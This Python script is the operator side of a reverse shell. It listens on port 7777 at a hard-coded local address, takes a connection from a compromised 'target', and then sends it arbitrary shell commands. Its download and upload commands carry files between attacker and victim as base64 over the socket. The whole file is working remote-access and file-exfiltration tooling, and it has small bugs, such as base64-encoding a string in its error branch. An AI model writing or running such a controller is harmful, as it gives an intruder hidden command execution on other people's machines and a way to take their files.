#!/usr/bin/python
import base64
import socket
import json
import base64

def send_j(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def recv_j():
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode('utf-8') #receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
                return json.loads(data) #
            except ValueError: #if the output of json.loads(data) is not complete (not in json format)
                continue
def shell():
    while True:
        cmd = input("# ")
        send_j(cmd) # send command to client
        if cmd == "exit_server":
            break
        elif cmd[:2] == "cd":
            continue
        elif cmd[:8] == "download":
            with open(cmd[9:],"wb") as f:
                data = recv_j()
                f.write(base64.b64decode(data)) #receive content of file from client and write into a speified file name

        elif cmd[:6] == "upload":
            try:
                with open(cmd[7:], "rb") as f:
                    send_j(base64.b64encode(f.read())) #send the content of the file in the server
            except:
                send_j(base64.b64encode("failed to upload").decode('utf-8'))
                continue
        output = recv_j() #receive output from client "target"
        print(output)

def server():
    global s
    global ip
    global target
    #creating socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET for IPv4 connexion and SOCK_STREAM for TCP connection
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #binding socket to local IP and port
    s.bind(("192.168.92.128", 7777)) #listening on port 7777
    s.listen(5) #max connections allowed on server
    print("Listening to incoming connections")
    target, ip = s.accept()
    print(f"connection established from:{ip}")

server()
shell()